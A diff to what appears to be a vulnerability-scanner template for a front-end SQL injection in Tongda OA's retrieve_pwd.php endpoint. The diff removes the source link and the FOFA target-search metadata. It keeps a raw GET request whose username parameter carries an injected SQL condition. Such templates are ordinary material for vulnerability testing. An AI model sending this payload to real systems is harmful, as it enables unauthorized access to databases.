@@ -3,12 +3,8 @@ info:
   name: 通达OA retrieve_pwd 前台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fw3s6spae9i570cb'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fw3s6spae9i570cb
-    fofa: app.name="通达 OA"
 http:
 - raw:
   - 'GET /ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%272+ HTTP/1.1
